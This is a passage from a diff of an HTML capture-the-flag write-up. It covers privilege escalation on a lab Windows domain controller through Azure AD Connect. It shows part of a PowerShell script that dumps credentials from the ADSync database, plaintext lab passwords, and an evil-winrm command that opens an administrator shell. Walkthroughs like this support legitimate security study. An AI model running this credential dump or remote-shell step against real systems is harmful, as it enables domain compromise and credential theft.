 <span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="op">[+]</span> <span class="va">$client</span> <span class="op">=</span> <span class="fu">new-object</span> System<span class="op">.</span><span class="fu">Data</span><span class="op">.</span><span class="fu">SqlClient</span><span class="op">.</span><span class="fu">SqlConnection</span> <span class="op">-</span>ArgumentList <span class="st">&quot;Data Source=localhost; Initial Catalog=ADSync; Trusted_Connection=True&quot;</span></span>
@@ -227,7 +275,8 @@ Password: 4n0therD4y@n0th3r$</p>
 <span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Write-Host</span> <span class="op">(</span><span class="st">&quot;Domain: &quot;</span> <span class="op">+</span> <span class="va">$domain</span><span class="op">.</span><span class="fu">Domain</span><span class="op">)</span></span>
 <span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Write-Host</span> <span class="op">(</span><span class="st">&quot;Username: &quot;</span> <span class="op">+</span> <span class="va">$username</span><span class="op">.</span><span class="fu">Username</span><span class="op">)</span></span>
 <span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Write-Host</span> <span class="op">(</span><span class="st">&quot;Password: &quot;</span> <span class="op">+</span> <span class="va">$password</span><span class="op">.</span><span class="fu">Password</span><span class="op">)</span></span></code></pre></div>
-<p>We transfer the script to the target machine and run it to get the administrator creds</p>
+<p>We transfer the script to the target machine and run it to get the
+administrator creds</p>
 <p><img src="/img/htb_montevarde/10.png" /></p>
 <p>Creds found:</p>
 <blockquote>
@@ -235,16 +284,25 @@ Password: 4n0therD4y@n0th3r$</p>
 Password: d0m@in4dminyeah!</p>
 </blockquote>
 <h2 id="administrator-shell">Administrator shell</h2>
-<p>We use evilwinrm to get a administrator shell and read our required root.txt.</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="at">-i</span> 10.10.10.172 <span class="at">-u</span> administrator <span class="at">-p</span> d0m@in4dminyeah!</span></code></pre></div>
+<p>We use evilwinrm to get a administrator shell and read our required
+root.txt.</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="at">-i</span> 10.10.10.172 <span class="at">-u</span> administrator <span class="at">-p</span> d0m@in4dminyeah!</span></code></pre></div>
 <p><img src="/img/htb_montevarde/11.png" /></p>
 <h1 id="resources">Resources:</h1>
 <ul>
-<li><p>Watch this video for in depth discussion of the azure AD exploit</p>
-<p><a href="http://www.youtube.com/watch?v=JEIR5oGCwdg"><img src="http://img.youtube.com/vi/JEIR5oGCwdg/0.jpg" /></a></p></li>
-<li><p>The original founder of the exploit foxit github contains the tools to do the privesc trick <a href="https://github.com/fox-it/adconnectdump">https://github.com/fox-it/adconnectdump</a></p></li>
+<li><p>Watch this video for in depth discussion of the azure AD
+exploit</p>
+<p><a href="http://www.youtube.com/watch?v=JEIR5oGCwdg"><img
+src="http://img.youtube.com/vi/JEIR5oGCwdg/0.jpg" /></a></p></li>
+<li><p>The original founder of the exploit foxit github contains the
+tools to do the privesc trick <a
+href="https://github.com/fox-it/adconnectdump">https://github.com/fox-it/adconnectdump</a></p></li>
 </ul>
-<p>PS: the compiled exe files will not work since that uses the local database. But we dont have a database running on our target machine and have to attack the localhost. So we must chnage the source and then compile it to use it.</p>
+<p>PS: the compiled exe files will not work since that uses the local
+database. But we dont have a database running on our target machine and
+have to attack the localhost. So we must chnage the source and then
+compile it to use it.</p>
 </article>
 
 <footer>
